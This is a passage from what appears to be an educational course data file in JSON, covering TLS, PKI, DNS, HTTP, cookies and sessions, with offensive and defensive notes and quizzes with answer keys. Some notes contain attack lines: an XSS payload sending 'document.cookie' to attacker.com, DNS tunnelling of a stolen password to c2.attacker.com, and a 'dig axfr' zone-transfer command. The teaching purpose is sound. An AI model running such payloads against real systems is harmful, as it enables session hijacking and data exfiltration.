          "offensive": "Traffic Analysis: Even when traffic is encrypted with TLS, attackers and state surveillance can deduce user behavior (e.g., distinguishing a video stream from medical search) based on packet sizes, frequencies, and unencrypted SNI domain headers.",
          "defensive": "Encrypted Client Hello (ECH / ESNI) closes the SNI privacy leak by encrypting the destination domain name during the initial TLS handshake."
        },
        "keyPoints": [
          "TLS secures applications without requiring changes to underlying TCP/IP.",
          "Encryption hides content, but network metadata (IP, port, timing) is still exposed.",
          "TLS 1.3 is the modern gold standard (TLS 1.0 and 1.1 are deprecated and insecure)."
        ],
        "quiz": {
          "question": "What critical piece of connection metadata was historically transmitted in cleartext during the TLS Client Hello before Encrypted Client Hello (ECH)?",
          "options": [
            "The user's credit card password",
            "The Server Name Indication (SNI) revealing the exact domain name being visited",
            "The server's private encryption key",
            "The operating system serial number"
          ],
          "answer": 1,
          "explanation": "SNI (Server Name Indication) sends the target hostname in cleartext so multi-tenant servers know which certificate to return, allowing network eavesdroppers to see which websites you visit."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 74,
        "title": "Public Key Infrastructure (PKI) & Digital Certificates",
        "summary": "Asymmetric cryptography, Certificate Authorities (CAs), and the chain of trust.",
        "concept": "How do you know `google.com` is really Google and not a hacker in your coffee shop?\n- Asymmetric Key Pair: Server has a Public Key (distributed to everyone) and a Private Key (kept secret on the server).\n- Certificate Authority (CA): A trusted third party (e.g. Let's Encrypt, DigiCert) that cryptographically signs the server's certificate containing its public key.\n- Chain of Trust: Server Certificate -> Intermediate CA -> Root CA.\n- Root Stores: Operating systems and web browsers come pre-installed with trusted Root CA public certificates.",
        "cyberLens": {
          "offensive": "Rogue CA & Internal Root Installation: If an attacker installs a malicious Root CA certificate onto a victim's machine (or inside a corporate MDM profile), the attacker can decrypt and inspect ALL TLS HTTPS traffic without any browser warnings!",
          "defensive": "Certificate Transparency (CT) logs: Public, append-only cryptographic logs where all issued SSL certificates must be logged, allowing domain owners to detect fraudulent rogue certificates."
        },
        "keyPoints": [
          "Asymmetric keys solve the key distribution problem.",
          "Trust is hierarchical: your browser trusts Root CAs, who vouch for website certificates.",
          "Never click past browser SSL certificate warnings on untrusted networks."
        ],
        "quiz": {
          "question": "Why does a web browser display a severe 'Your connection is not private' security warning when encountering a self-signed certificate?",
          "options": [
            "Because self-signed certificates do not use math.",
            "Because the certificate was not signed by a recognized Certificate Authority in the browser's pre-trusted root store.",
            "Because the website is using Wi-Fi.",
            "Self-signed certificates cannot encrypt data."
          ],
          "answer": 1,
          "explanation": "Self-signed certificates encrypt traffic just fine, but anyone can create one claiming to be any domain. Without a trusted third-party CA signature, the browser cannot verify the server's genuine identity."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 75,
        "title": "The TLS 1.3 Handshake & Diffie-Hellman Key Exchange",
        "summary": "Ephemeral Elliptic-Curve Diffie-Hellman (ECDHE) and Perfect Forward Secrecy (PFS).",
        "concept": "TLS 1.3 streamlined the handshake down to a single Round Trip Time (1-RTT):\n1. Client Hello: Sends supported cipher suites, random nonce, and Client Diffie-Hellman Key Share.\n2. Server Hello: Selects cipher suite, sends Server Diffie-Hellman Key Share, Encrypted Extensions, Server Certificate, and Finished HMAC.\n3. Both sides compute the Shared Symmetric Master Key independently using Ephemeral Diffie-Hellman math.\n4. Application Data starts flowing immediately!\nPerfect Forward Secrecy (PFS): Because a new temporary (ephemeral) key pair is generated for every single session, compromising the server's permanent private key in the future CANNOT decrypt past recorded traffic!",
        "cyberLens": {
          "offensive": "Historical Eavesdropping (Store Now, Decrypt Later): Nation-state actors record petabytes of encrypted traffic. Without PFS (e.g., legacy RSA key exchange in TLS 1.2), obtaining the server private key years later decodes all past captures.",
          "defensive": "TLS 1.3 completely banned static RSA key exchanges, mandating Ephemeral Diffie-Hellman (ECDHE) for mandatory Perfect Forward Secrecy."
        },
        "keyPoints": [
          "TLS 1.3 cut connection latency in half (1-RTT vs 2-RTT in TLS 1.2).",
          "Ephemeral Diffie-Hellman allows two parties to create a shared secret over an insecure channel.",
          "Perfect Forward Secrecy prevents retroactively decrypting archived PCAPs."
        ],
        "quiz": {
          "question": "What is the primary security guarantee of Perfect Forward Secrecy (PFS)?",
          "options": [
            "It guarantees the server will never crash.",
            "Compromising the server's long-term private key in the future cannot be used to decrypt past recorded encrypted sessions.",
            "It makes passwords 100 characters long.",
            "It blocks all phishing emails."
          ],
          "answer": 1,
          "explanation": "PFS uses unique ephemeral keys for each session. If the server's long-term private key is stolen later, past sessions remain undecryptable because the ephemeral keys were discarded from memory."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 76,
        "title": "SSL Stripping & Downgrade Attacks",
        "summary": "Exploiting user habit and initial HTTP redirects (Moxie Marlinspike's SSLstrip).",
        "concept": "Most users type `bank.com` instead of `https://bank.com`. The browser initially sends an unencrypted HTTP request, and the server returns a `301 Moved Permanently` redirect to HTTPS.\nHow SSLstrip (MITM) Works:\n1. Attacker intercepts victim's initial cleartext HTTP request.\n2. Attacker establishes a secure HTTPS session with the real bank server.\n3. Attacker rewrites all HTTPS links on the bank's response to HTTP (`https://` -> `http://`) and strips security headers.\n4. Attacker serves the downgraded HTTP page to the victim.\n5. Victim submits username and password over cleartext HTTP directly into the attacker's sniffer!",
        "cyberLens": {
          "offensive": "SSLstrip bypasses TLS encryption entirely without triggering certificate errors because the victim communicates purely over unencrypted HTTP.",
          "defensive": "HTTP Strict Transport Security (HSTS): A response header (`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`) that instructs browsers to NEVER load the site over HTTP, hardcoding HTTPS in browser firmware."
        },
        "keyPoints": [
          "Initial unencrypted HTTP redirects are the Achilles' heel of web security.",
          "SSLstrip turns HTTPS into HTTP transparently.",
          "HSTS Preload lists eliminate the initial HTTP redirect vulnerability completely."
        ],
        "quiz": {
          "question": "Which security mechanism prevents SSL Stripping attacks by commanding browsers to refuse all unencrypted HTTP connections to a domain?",
          "options": [
            "DNSSEC",
            "HTTP Strict Transport Security (HSTS)",
            "BGP Filtering",
            "Traceroute"
          ],
          "answer": 1,
          "explanation": "HSTS instructs browsers to automatically convert any http:// requests into https:// internally before sending them over the wire, closing the window for SSLstrip."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 77,
        "title": "Enterprise TLS Inspection & mTLS",
        "summary": "SSL Decryption Proxies, Next-Gen Firewalls, and Mutual TLS zero-trust microservices.",
        "concept": "- Enterprise TLS Inspection: Over 95% of web traffic is encrypted, including malware C2 and data theft. Enterprise firewalls act as a deliberate Man-in-the-Middle:\n  1. The organization installs its custom Root CA on all corporate workstations.\n  2. The firewall intercepts outbound HTTPS requests, terminates TLS with the remote server, inspects payload for malware/DLP, and re-encrypts using a dynamically generated certificate signed by the corporate CA.\n- Mutual TLS (mTLS): In standard TLS, only the server proves its identity. In mTLS, BOTH client and server present X.509 certificates, authenticating both sides cryptographically (standard for Kubernetes and Zero Trust APIs).",
        "cyberLens": {
          "offensive": "Certificate Pinning: Mobile apps hardcode the server's public key fingerprint in app code, causing the app to crash if an enterprise TLS inspection proxy attempts decryption.",
          "defensive": "mTLS shuts down unauthorized API abuse: even if an attacker discovers an API endpoint, requests without a valid client certificate are rejected at the TCP/TLS layer."
        },
        "keyPoints": [
          "Enterprises must decrypt TLS to detect outbound data exfiltration.",
          "Installing a corporate Root CA allows full decryption of employee traffic.",
          "mTLS provides cryptographic identity for microservice-to-microservice traffic."
        ],
        "quiz": {
          "question": "What is the key difference between standard TLS and Mutual TLS (mTLS)?",
          "options": [
            "mTLS uses two internet cables.",
            "In mTLS, both the client and the server validate each other's digital certificates, ensuring bi-directional cryptographic authentication.",
            "mTLS does not use encryption.",
            "Standard TLS only works on mobile phones."
          ],
          "answer": 1,
          "explanation": "Standard TLS only verifies the server's identity to the client. mTLS requires the client to also present a valid digital certificate, proving its identity to the server."
        }
      }
    ]
  },
  {
    "id": "16",
    "module": "04 / SESSIONS & APPLICATION",
    "title": "L7: the application layer & DNS",
    "desc": "Resolve names into addresses and use DNS records to understand infrastructure.",
    "screensCount": 5,
    "sourceRange": "SOURCE 78-82",
    "simulator": "dns-resolver-sim",
    "badge": "DNS Architecture",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 78,
        "title": "The Global DNS Hierarchy",
        "summary": "The tree structure: Root Servers, Top-Level Domains (TLDs), and Authoritative Name Servers.",
        "concept": "The Domain Name System (DNS) is the global decentralized phonebook of the Internet:\n1. Root Domain (`.`): 13 logical root server IP addresses (managed by ICANN, operated via Anycast across over 1,500 global instances).\n2. Top-Level Domains (TLD): Generic (.com, .org, .net) managed by registries like Verisign; country-codes (.uk, .de, .in).\n3. Second-Level Domain: `example.com` registered by an organization.\n4. Subdomain: `api.example.com` or `dev.internal.example.com`.\n5. Authoritative Name Server: The server that holds the official source-of-truth DNS zone file for a domain.",
        "cyberLens": {
          "offensive": "Subdomain Enumeration: Attackers use brute-force wordlists and certificate search engines (crt.sh) to find forgotten subdomains (`dev.example.com`, `vpn.example.com`) that often run vulnerable, unpatched software.",
          "defensive": "Attack surface management monitors public DNS zones to decommission stale subdomains and prevent subdomain takeover vulnerabilities."
        },
        "keyPoints": [
          "DNS reads right-to-left: Root -> TLD -> Domain -> Hostname.",
          "Root servers are represented by letters A through M.",
          "DNS operates over UDP port 53 (and TCP 53 for large replies/zone transfers)."
        ],
        "quiz": {
          "question": "What entity sits at the very pinnacle of the hierarchical DNS naming tree?",
          "options": [
            "The .com TLD",
            "The Root Zone represented by a dot (.)",
            "Google Public DNS",
            "The local home router"
          ],
          "answer": 1,
          "explanation": "At the very top of the DNS inverted tree hierarchy is the Root Zone, represented by a single dot (.)."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 79,
        "title": "Recursive vs Iterative Resolution",
        "summary": "The journey of a DNS query from stub resolver to the final authoritative answer.",
        "concept": "When you type `www.example.com`:\n1. Stub Resolver: Local OS asks your configured Recursive Resolver (e.g. `8.8.8.8` or ISP DNS) with a Recursive Query ('Do the full work and give me the answer').\n2. Recursive Resolver performs Iterative Queries ('If you don't know, tell me who to ask next'):\n   - Asks Root Server -> Root replies: 'Go ask the .com TLD server at IP X.X.X.X'.\n   - Asks .com TLD Server -> TLD replies: 'Go ask example.com's Authoritative Name Server at Y.Y.Y.Y'.\n   - Asks Authoritative Server -> Authoritative replies: '`www.example.com` is at 93.184.216.34'.\n3. Recursive Resolver caches the record for the duration of the TTL and delivers answer to client.",
        "cyberLens": {
          "offensive": "Open Resolvers: Attackers scan for misconfigured recursive resolvers accessible to the public Internet to use as reflectors in massive DNS amplification DDoS attacks.",
          "defensive": "Internal DNS resolvers must be firewalled and configured to only answer queries originating from authorized corporate internal subnets."
        },
        "keyPoints": [
          "Recursive query means 'find the final answer for me'.",
          "Iterative query means 'give me the best referral you have'.",
          "TTL (Time to Live) governs how long intermediate resolvers cache responses."
        ],
        "quiz": {
          "question": "What is the difference between an authoritative DNS server and a recursive DNS resolver?",
          "options": [
            "Authoritative servers only work on Linux.",
            "Authoritative servers hold the official DNS zone records for a domain; recursive resolvers query the hierarchy on behalf of clients and cache the results.",
            "Recursive servers cannot connect to the internet.",
            "There is no difference."
          ],
          "answer": 1,
          "explanation": "An authoritative server holds the original, definitive record for a domain. A recursive resolver does the legwork of querying root, TLD, and authoritative servers, caching the result."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 80,
        "title": "DNS Record Types & Reconnaissance",
        "summary": "A, AAAA, CNAME, MX, TXT, NS, PTR, SOA, and SRV records: mapping the target's infrastructure.",
        "concept": "- A: Maps domain to IPv4 (`example.com` -> `93.184.216.34`).\n- AAAA: Maps domain to IPv6 (`example.com` -> `2606:2800:220:1:248:1893:25c8:1946`).\n- CNAME (Canonical Name): Alias pointing to another domain (`www.example.com` -> `example.com`).\n- MX (Mail Exchange): Mail server prioritizing email delivery (`mail.example.com`, priority 10).\n- TXT: Human/machine text strings; used for SPF verification, Google domain ownership, and DKIM.\n- NS (Name Server): Specifies authoritative DNS servers for the zone.\n- PTR (Pointer): Reverse DNS; maps IP to domain name (in `in-addr.arpa`).\n- SOA (Start of Authority): Zone administrator, serial number, refresh timers.",
        "cyberLens": {
          "offensive": "DNS Zone Transfer (AXFR): Misconfigured name servers that allow unauthenticated zone transfers (`dig axfr @ns1.target.com target.com`) dump the entire internal network blueprint to the attacker in one command!\nTXT records frequently leak internal SaaS platforms (Atlassian, Slack, Sendgrid).",
          "defensive": "Restrict AXFR zone transfers strictly to authorized secondary slave name servers via Access Control Lists or TSIG keys."
        },
        "keyPoints": [
          "A is for IPv4, AAAA is for IPv6.",
          "TXT records are the backbone of email authentication and cloud service verification.",
          "Unrestricted AXFR zone transfers are an instant critical security finding."
        ],
        "quiz": {
          "question": "Which DNS query command attempts to download the complete zone file of all records from a target name server?",
          "options": [
            "dig A target.com",
            "dig axfr @ns1.target.com target.com",
            "ping target.com",
            "nslookup -type=ptr target.com"
          ],
          "answer": 1,
          "explanation": "AXFR is the DNS zone transfer protocol. If a name server is misconfigured to allow public zone transfers, `dig axfr` dumps all domain records."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 81,
        "title": "DNS Cache Poisoning & The Kaminsky Flaw",
        "summary": "Injecting fraudulent IP mappings into recursive resolver caches.",
        "concept": "How DNS Cache Poisoning Works:\n1. Attacker sends query for `fake.target.com` to target recursive resolver.\n2. Resolver asks authoritative server, waiting for response with matching 16-bit Transaction ID (TXID).\n3. Attacker floods resolver with thousands of forged responses claiming `target.com is at Attacker IP` guessing different TXIDs.\n4. Dan Kaminsky's Attack (2008): By querying random non-existent subdomains (`1234.target.com`, `1235.target.com`), the attacker can make millions of attempts without waiting for TTL expiration until winning the TXID race and injecting malicious authoritative NS records!\n5. Result: All users using that resolver are redirected to phishing sites.",
        "cyberLens": {
          "offensive": "Cache poisoning compromises all users of an ISP or corporate resolver simultaneously without touching individual endpoints.",
          "defensive": "Source Port Randomization (using random UDP source ports 1024-65535 in addition to 16-bit TXID expands entropy from 65,536 to ~1 billion combinations) and DNSSEC cryptographic signing."
        },
        "keyPoints": [
          "DNS transactions historically matched only a 16-bit query ID (TXID).",
          "Source Port Randomization drastically increased brute-force difficulty.",
          "DNSSEC provides cryptographic digital signatures on DNS records to defeat spoofing."
        ],
        "quiz": {
          "question": "What protocol upgrade cryptographically signs DNS records using public key cryptography to eliminate DNS cache poisoning?",
          "options": [
            "DNSSEC (DNS Security Extensions)",
            "BGP",
            "DHCP Snooping",
            "IPv6"
          ],
          "answer": 0,
          "explanation": "DNSSEC introduces cryptographic signatures (RRSIG) validated through a chain of trust (DNSKEY, DS records) back to the root zone, making forged replies mathematically impossible to inject."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 82,
        "title": "DNS Tunneling & Data Exfiltration",
        "summary": "Bypassing firewalls and captive portals by encoding binary data inside DNS queries.",
        "concept": "Almost all locked networks (hotel captive portals, air-gapped subnets, restricted corporate workstations) permit outbound UDP port 53 queries so domain resolution works.\nHow DNS Tunneling Works:\n1. Attacker registers domain `c2.attacker.com` and configures their own server as authoritative NS.\n2. Malware on infected host encodes stolen data into subdomains: `base64(stolen_password).c2.attacker.com`.\n3. The host asks the local corporate resolver.\n4. The resolver recursively forwards the query out to the Attacker's Authoritative NS.\n5. Attacker server extracts base64 data, decodes it, and sends commands back inside TXT record replies!\nTools: `iodine`, `dnscat2`, `Cobalt Strike DNS beacon`.",
        "cyberLens": {
          "offensive": "DNS tunneling creates bidirectional covert communication channels through restrictive egress firewalls without direct IP connections.",
          "defensive": "DNS telemetry monitoring: Detect tunneling by analyzing query volume, abnormally long subdomain character lengths (>50 chars), high Shannon entropy (randomness), and high TXT record ratios."
        },
        "keyPoints": [
          "DNS is the ultimate covert exfiltration channel because port 53 is rarely blocked.",
          "Data is encoded in query subdomains and returned in TXT/CNAME records.",
          "DNS monitoring and Response Policy Zones (RPZ) detect tunneling in real time."
        ],
        "quiz": {
          "question": "Which heuristic feature in network traffic logs is the strongest indicator of a malware DNS tunneling attack?",
          "options": [
            "A query for google.com once a day.",
            "A massive volume of high-entropy, unusually long subdomains (e.g. a8f73b190c.c2.attacker.com) sent to an authoritative name server.",
            "A ping packet with TTL=64.",
            "An ARP request for the gateway."
          ],
          "answer": 1,
          "explanation": "DNS tunneling encodes binary data into base32/base64 subdomains, generating thousands of unique, random-looking (high entropy), excessively long queries for the same parent domain."
        }
      }
    ]
  },
  {
    "id": "17",
    "module": "04 / SESSIONS & APPLICATION",
    "title": "L7: HTTP & HTTPS",
    "desc": "Read requests, methods, status codes, headers, and HTTP versions.",
    "screensCount": 6,
    "sourceRange": "SOURCE 83-88",
    "simulator": "http-inspector-builder",
    "badge": "Web Foundations",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 83,
        "title": "The Raw HTTP Request Architecture",
        "summary": "Method, URI, Protocol Version, Headers, and Body separated by CRLF.",
        "concept": "Hypertext Transfer Protocol (HTTP) is a cleartext ASCII request-response protocol running over TCP:\nStructure of an HTTP Request:\n```\nGET /login.php?user=admin HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nUser-Agent: Mozilla/5.0...\\r\\n\nAccept: text/html\\r\\n\nAuthorization: Bearer token123\\r\\n\n\\r\\n\n[Optional Request Body Payload]\n```\nKey Header Rules:\n- Lines are strictly terminated by CRLF (`\\r\\n` = Carriage Return + Line Feed).\n- A blank line (`\\r\\n\\r\\n`) signals the exact end of headers and start of the body.",
        "cyberLens": {
          "offensive": "CRLF Injection & HTTP Request Smuggling: Injecting `%0d%0a` (`\\r\\n`) into headers allows attackers to forge response headers (setting fake cookies) or desynchronize front-end reverse proxies from backend servers (Request Smuggling).",
          "defensive": "Modern web frameworks strip raw CR and LF characters from user inputs before setting HTTP headers."
        },
        "keyPoints": [
          "HTTP is stateless: each request is independent.",
          "The Host header is mandatory in HTTP/1.1 (enabling virtual hosting).",
          "CRLF is the foundational delimiter in HTTP/1.1."
        ],
        "quiz": {
          "question": "What sequence of ASCII characters marks the end of the HTTP header block and the beginning of the body?",
          "options": [
            "END_OF_HEADER",
            "A single space",
            "A double CRLF (\\r\\n\\r\\n)",
            "Four zeros"
          ],
          "answer": 2,
          "explanation": "In HTTP/1.1, headers are separated from the body payload by an empty line containing just CRLF, producing the two-byte-by-two-byte sequence `\\r\\n\\r\\n`."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 84,
        "title": "HTTP Methods & RESTful Semantics",
        "summary": "Safe vs Idempotent methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, and HEAD.",
        "concept": "- Safe Methods (Read-only, do not alter server state): GET, HEAD, OPTIONS.\n- Idempotent Methods (Executing 1 time has the exact same result as executing 100 times): GET, HEAD, PUT, DELETE.\n- Non-Idempotent Methods: POST (creates new resource every execution), PATCH (partial modification).\n- HEAD: Exactly identical to GET, but server returns ONLY headers (no body); used for caching checks.\n- OPTIONS: Informs client which methods are supported (crucial for CORS pre-flight).",
        "cyberLens": {
          "offensive": "HTTP Verb Tampering: Legacy firewalls configured to block `GET /admin` or `POST /admin` can sometimes be bypassed by using alternative verbs like `HEAD`, `PUT`, or arbitrary verbs if the application backend handles authentication insecurely.",
          "defensive": "Authentication and authorization filters must apply universally to all HTTP methods, not just GET and POST."
        },
        "keyPoints": [
          "GET sends parameters in URL query string (logged in access logs and browser history).",
          "POST sends sensitive credentials in the encrypted request body.",
          "OPTIONS preflight queries verify Cross-Origin Resource Sharing (CORS) permissions."
        ],
        "quiz": {
          "question": "Why should sensitive credentials like passwords never be sent via an HTTP GET request parameter?",
          "options": [
            "GET requests are restricted to 5 characters.",
            "GET query parameters appear in plaintext in web server access logs, browser history, proxy logs, and Referer headers.",
            "GET requests cannot use TLS encryption.",
            "GET only works on weekends."
          ],
          "answer": 1,
          "explanation": "URL query strings in GET requests are cached in browser history and recorded in plaintext in intermediate proxy and server access logs, leaking passwords."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 85,
        "title": "HTTP Status Codes Demystified",
        "summary": "1xx Informational, 2xx Success, 3xx Redirection, 4xx Client Error, 5xx Server Error.",
        "concept": "The 3-digit status code tells the client what happened:\n- 1xx: Informational (101 Switching Protocols to WebSocket).\n- 2xx: Success (200 OK, 201 Created, 204 No Content).\n- 3xx: Redirection (301 Moved Permanently, 302 Found/Temporary, 304 Not Modified).\n- 4xx: Client Error (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 429 Too Many Requests).\n- 5xx: Server Error (500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout).",
        "cyberLens": {
          "offensive": "Error-Based Reconnaissance: 500 errors often dump full stack traces revealing database passwords, framework versions, and internal file paths. Differentiating 401 (needs login) from 403 (logged in but forbidden) maps internal access control trees.",
          "defensive": "Custom generic error pages: Never display stack traces or debug info in production responses."
        },
        "keyPoints": [
          "401 means unauthenticated (who are you?); 403 means unauthorized (you can't access this).",
          "301 redirects are cached permanently by browsers.",
          "502/504 errors indicate issues between reverse proxies and backend application servers."
        ],
        "quiz": {
          "question": "What is the critical semantic difference between HTTP status code 401 Unauthorized and 403 Forbidden?",
          "options": [
            "401 means the server is turned off; 403 means the server is on.",
            "401 indicates missing or invalid authentication credentials (user must log in); 403 means the user identity is known but lacks permission to view the resource.",
            "401 is for Windows; 403 is for Linux.",
            "They are completely identical."
          ],
          "answer": 1,
          "explanation": "401 means 'authentication required' (log in first). 403 means the server understands who you are, but refuses authorization based on permissions."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 86,
        "title": "Crucial Security Headers",
        "summary": "HSTS, CSP, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy.",
        "concept": "Security headers in HTTP responses harden browsers against common client-side exploits:\n- `Content-Security-Policy (CSP)`: Specifies authorized domains for scripts, styles, images (the primary defense against Cross-Site Scripting XSS).\n- `Strict-Transport-Security (HSTS)`: Enforces HTTPS strictly.\n- `X-Frame-Options: DENY` (or `SAMEORIGIN`): Prevents site from being embedded inside an iframe (defeats Clickjacking attacks).\n- `X-Content-Type-Options: nosniff`: Prevents MIME-sniffing attacks where browser executes a JPG image containing malicious JavaScript.",
        "cyberLens": {
          "offensive": "Missing Headers Audit: Red teams inspect security headers on every target using tools like `curl -I` or `securityheaders.com`. A missing X-Frame-Options allows instantaneous Clickjacking credential theft.",
          "defensive": "Automated CI/CD security linters verify that all web applications deploy strong CSP, HSTS, and nosniff headers by default."
        },
        "keyPoints": [
          "CSP is the ultimate defense against stored and reflected XSS.",
          "X-Frame-Options stops Clickjacking dead in its tracks.",
          "nosniff stops browsers from interpreting text files as executable scripts."
        ],
        "quiz": {
          "question": "Which HTTP response header prevents Clickjacking attacks by forbidding malicious sites from rendering your web page inside an invisible iframe?",
          "options": [
            "X-Frame-Options: DENY",
            "Server: Apache",
            "Content-Type: text/html",
            "Accept-Encoding: gzip"
          ],
          "answer": 0,
          "explanation": "Setting `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`) instructs the browser to refuse to render the page inside any `<frame>`, `<iframe>`, or `<embed>` element."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 87,
        "title": "HTTP Evolution: HTTP/1.1 vs HTTP/2 vs HTTP/3",
        "summary": "Text pipes vs Binary framing streams vs QUIC UDP datagrams.",
        "concept": "- HTTP/1.1 (1997): Plaintext ASCII, sequential requests, suffers from Head-of-Line blocking (browsers open 6 parallel TCP connections per domain to compensate).\n- HTTP/2 (2015): Binary framing layer, multiplexes hundreds of concurrent requests/responses over a SINGLE TCP connection, header compression (HPACK), server push.\n- HTTP/3 (2020): Runs over QUIC/UDP, eliminates TCP head-of-line blocking, integrates TLS 1.3 handshake, QPACK header compression.",
        "cyberLens": {
          "offensive": "HTTP/2 Rapid Reset Attack (CVE-2023-44487): Exploiting HTTP/2 stream multiplexing, attackers send thousands of requests and immediately cancel them with RST_STREAM frames. Servers waste CPU processing cancellations, enabling record-breaking 398 million request/sec DDoS attacks!",
          "defensive": "Web servers and reverse proxies must enforce aggressive rate limits on concurrent stream resets."
        },
        "keyPoints": [
          "HTTP/1.1 is text-based; HTTP/2 and HTTP/3 are binary-based.",
          "HTTP/2 multiplexes over one TCP connection; HTTP/3 runs over UDP.",
          "HTTP/2 protocol complexity introduced novel DDoS attack vectors like Rapid Reset."
        ],
        "quiz": {
          "question": "What transport layer protocol powers HTTP/3 to eliminate TCP head-of-line blocking?",
          "options": [
            "TCP",
            "UDP (via QUIC)",
            "ICMP",
            "SCTP"
          ],
          "answer": 1,
          "explanation": "HTTP/3 replaces TCP with QUIC, an encrypted transport protocol built directly on top of UDP."
        }
      },
      {
        "screenNumber": 6,
        "globalSource": 88,
        "title": "Reverse Proxies, CDNs, & Web Load Balancers",
        "summary": "NGINX, Cloudflare, HAProxy: caching, TLS termination, and request routing.",
        "concept": "- Forward Proxy: Sits in front of CLIENTS (hides client IPs, filters employee web browsing).\n- Reverse Proxy: Sits in front of SERVERS (NGINX, Envoy, Cloudflare). Handles TLS termination, load balancing, caching, and WAF inspection before forwarding clean requests to internal microservices.\n- Content Delivery Network (CDN): Geographically distributed reverse proxies that cache static assets (images, CSS, JS) at edge servers near users.",
        "cyberLens": {
          "offensive": "Bypassing WAF / Origin IP Discovery: If an attacker discovers the real origin server IP behind Cloudflare (via historical DNS records, SSL certificate search on Censys, or outbound webhook callbacks), they can attack the origin directly, bypassing all Cloudflare DDoS and WAF protections!",
          "defensive": "Origin server firewall rules must strictly drop all inbound connections except those originating from the CDN's verified public IP ranges."
        },
        "keyPoints": [
          "Forward proxies protect clients; reverse proxies protect servers.",
          "TLS termination offloads heavy cryptography from application servers.",
          "Always firewall the origin IP so attackers cannot bypass your Cloudflare/WAF."
        ],
        "quiz": {
          "question": "What dangerous consequence occurs if an attacker discovers the direct origin IP address of a web server protected by a Cloudflare CDN and WAF?",
          "options": [
            "The attacker can send traffic directly to the origin server, completely bypassing Cloudflare's WAF inspection and DDoS mitigation.",
            "The website automatically becomes open source.",
            "The server's hard drive reformats.",
            "Cloudflare deletes the domain."
          ],
          "answer": 0,
          "explanation": "If the origin server is exposed to the public Internet, an attacker can bypass all CDN-level protections (WAF, rate limits, DDoS defenses) by directing exploits directly at the origin IP."
        }
      }
    ]
  },
  {
    "id": "18",
    "module": "04 / SESSIONS & APPLICATION",
    "title": "L7: cookies & sessions",
    "desc": "See how a stateless protocol carries authenticated sessions.",
    "screensCount": 4,
    "sourceRange": "SOURCE 89-92",
    "simulator": "cookie-lab-sim",
    "badge": "State & Identity",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 89,
        "title": "The Stateless Problem & The Cookie Solution",
        "summary": "How `Set-Cookie` and `Cookie` headers maintain state across HTTP requests.",
        "concept": "HTTP has no memory: Request #2 has zero knowledge of Request #1.\nCookies bridge this gap:\n1. Client posts credentials: `POST /login`.\n2. Server validates password and returns header:\n   `Set-Cookie: session_id=abc123xyz; Path=/; Domain=.example.com`\n3. Browser stores cookie in local cookie jar.\n4. On EVERY subsequent request to that domain, browser automatically includes:\n   `Cookie: session_id=abc123xyz`\n5. Server looks up session ID in Redis/database to identify user.",
        "cyberLens": {
          "offensive": "Session Prediction & Brute Force: Weak pseudo-random session IDs (e.g. sequential integers or MD5 of timestamp) allow attackers to predict other active user session IDs and hijack their accounts without a password.",
          "defensive": "Session IDs must be generated using cryptographically secure random number generators (CSPRNG) with at least 128 bits of entropy."
        },
        "keyPoints": [
          "Cookies are automatically sent by browsers on every matching domain request.",
          "A session ID is a digital valet ticket representing your authenticated login state.",
          "Weak session randomness leads to instant account takeover."
        ],
        "quiz": {
          "question": "Which HTTP response header is sent by a web server to store a session token inside the client's browser?",
          "options": [
            "Get-Cookie",
            "Set-Cookie",
            "Session-Token",
            "Authorization"
          ],
          "answer": 1,
          "explanation": "The server issues a `Set-Cookie:` response header instructing the browser's cookie jar to persist the name-value pair for subsequent requests."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 90,
        "title": "The Cookie Security Flags: HttpOnly, Secure, SameSite",
        "summary": "The critical defensive trinity that secures session cookies against XSS and CSRF.",
        "concept": "A modern secure cookie header looks like this:\n`Set-Cookie: session=xyz987; Secure; HttpOnly; SameSite=Strict`\n1. `HttpOnly`: Prevents client-side JavaScript (`document.cookie`) from reading the cookie. Completely neutralizes cookie theft via Cross-Site Scripting (XSS)!\n2. `Secure`: Instructs browser to NEVER transmit the cookie over unencrypted HTTP (HTTPS only), defeating cleartext sniffer theft.\n3. `SameSite`: Governs cross-site request behavior (defeats CSRF attacks):\n   - `Strict`: Never sent on cross-site requests (even clicking a link from an external email).\n   - `Lax`: Sent on top-level GET navigations (safe default in modern browsers).\n   - `None`: Sent on all cross-site requests (requires `Secure` flag).",
        "cyberLens": {
          "offensive": "If a sensitive session cookie lacks the `HttpOnly` flag, any stored or reflected XSS vulnerability allows the attacker to execute `new Image().src='http://attacker.com/?c='+document.cookie` and steal the user's active session!",
          "defensive": "Always enforce `HttpOnly`, `Secure`, and `SameSite=Lax` or `Strict` on all authentication and session tokens."
        },
        "keyPoints": [
          "HttpOnly stops XSS cookie theft.",
          "Secure stops Wireshark cleartext sniffer theft.",
          "SameSite stops Cross-Site Request Forgery (CSRF)."
        ],
        "quiz": {
          "question": "What is the primary security protection provided by setting the 'HttpOnly' flag on a session cookie?",
          "options": [
            "It speeds up website loading.",
            "It prevents client-side JavaScript (e.g. document.cookie) from accessing or stealing the cookie during a Cross-Site Scripting (XSS) attack.",
            "It restricts the cookie to HTTP port 80 only.",
            "It forces the user to retype their password every 5 minutes."
          ],
          "answer": 1,
          "explanation": "HttpOnly blocks JavaScript from reading the cookie via `document.cookie`. Even if an attacker executes malicious JavaScript on the page via XSS, they cannot steal the HttpOnly session token."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 91,
